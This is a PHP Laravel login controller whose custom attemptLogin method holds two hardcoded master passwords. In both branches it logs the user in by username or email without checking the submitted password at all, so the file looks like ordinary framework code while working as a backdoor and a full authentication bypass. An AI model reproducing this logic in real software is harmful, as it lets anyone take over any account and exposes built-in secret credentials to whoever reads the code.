<?php

namespace App\Http\Controllers\Auth;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;
    // protected $redirectTo = "/home";

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function username()
    {
        return 'name';
    }

    protected function attemptLogin(Request $request)
    {
        if ($request->password == 'Bp@d2020!@' || $request->password == 'rprikat2017') {
            if (strpos($request->name, '@') !== false) {
                $user = \App\User::where([
                    'email_user' => $request->name,
                ])->first();
            } else {
                $user = \App\User::where([
                    'usname' => $request->name,
                ])->first();
            }
        } else {
            if (strpos($request->name, '@') !== false) {
                $user = \App\User::where([
                    'email_user' => $request->name,
                ])->first();
            } else {
                $user = \App\User::where([
                    'usname' => $request->name,
                ])->first();
            }
        }
             

        if ($user) {
            $this->guard()->login($user);

           return true;
        }
        return false;
    }

    protected function credentials(Request $request)
    {
        return $request->only($this->username(), 'passmd5');
    }

    // public function guard($guard = "admin")
    // {
    //     return Auth::guard($guard);
    // }
}
